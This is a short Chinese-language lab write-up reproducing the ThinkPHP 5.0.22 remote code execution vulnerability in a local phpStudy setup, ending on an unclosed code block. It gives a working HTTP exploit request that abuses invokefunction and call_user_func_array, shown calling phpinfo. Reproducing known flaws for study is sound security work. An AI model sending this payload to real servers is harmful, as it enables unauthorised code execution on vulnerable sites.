markdown
# ThinkPHP 5.0.22 RCE 漏洞手工复现

## 1. 漏洞背景
在使用黑盒测试时，通过指纹识别发现目标使用了 ThinkPHP 5.0.22 框架，该版本存在远程代码执行漏洞。
###（url栏出现了'/index.php?s='被认定为thinkphp5专属标识）

## 2. 环境搭建
- 本地使用 phpStudy 搭建环境。
- PHP 版本必须降至 5.6 或 7.0（高版本 7.4 会因反射机制报错）。
- 网站根目录必须指向 `public` 文件夹。

## 3. 验证漏洞
使用最无害的 `phpinfo` 函数进行验证，手工构造的 Payload 如下：

```http
GET /index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1
